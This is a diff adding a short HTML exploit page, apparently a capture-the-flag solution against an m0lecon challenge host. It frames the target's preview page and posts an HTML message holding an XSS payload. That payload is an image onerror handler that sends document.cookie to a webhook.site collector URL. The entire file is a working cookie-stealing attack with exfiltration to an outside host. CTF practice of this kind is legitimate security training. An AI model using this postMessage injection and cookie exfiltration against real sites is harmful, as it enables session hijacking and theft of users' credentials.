@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <iframe id="target" src="https://ccaa1fca-c293-4ce1-84e6-3ef32fd022f7.offsec.m0lecon.it/preview"></iframe>
+
+  <script>
+    const iframe = document.getElementById('target');
+
+    // 2. Wait for the page to load
+    iframe.onload = () => {
+      
+      // 3. set the payload
+      const payload = "<img src='x' onerror='fetch(\"https://webhook.site/136262ac-d540-405d-bd93-206778f5fd62?flag=\" + document.cookie)'>";
+
+      // 4. put it in the frame
+      iframe.contentWindow.postMessage({
+        html: payload,
+        subject: "Pwned!"
+      }, '*');
+    };
+  </script>
+</body>
+</html>
